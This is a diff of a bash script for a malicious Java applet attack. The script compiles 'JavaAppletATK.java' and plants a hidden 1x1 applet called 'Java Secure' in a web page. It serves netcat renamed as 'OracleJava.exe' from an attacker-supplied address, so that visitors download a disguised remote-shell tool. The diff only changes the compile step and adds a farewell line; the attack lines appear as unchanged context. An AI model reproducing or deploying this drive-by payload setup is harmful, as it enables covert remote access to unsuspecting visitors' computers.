@@ -1,13 +1,11 @@
 #!/bin/bash
-echo
-printf "\033[1;33m[!] Please provide the path for .java file.\033[0m\n"
-read javafile
+
 echo
 printf "\033[1;33m[?] What is the version of java that you want to use? (Ex. 1.8)\033[0m\n"
 read javaversion
 echo
-printf "\033[1;33m[Info] Starting to compile the provided Java code...\033[0m\n"
-javac -source $javaversion -target $javaversion $javafile
+printf "\033[1;33m[Info] Starting to compile JavaAppletATK.java...\033[0m\n"
+javac -source $javaversion -target $javaversion JavaAppletATK.java
 echo
 printf "\033[1;33m[Info] Done.\033[0m\n"
 echo
@@ -33,5 +31,6 @@ read address
 echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://$address/OracleJava.exe"></applet>' > /var/www/html/$htmlfiletoembed
 printf "\033[1;33m[Info] Applet embed successfully in $htmlfiletoembed.\033[0m\n"
 cp /usr/share/windows-binaries/nc.exe /var/www/html/OracleJava.exe
-
+printf "\033[1;33m[!] ByeBye.\033[0m\n"
+echo
 
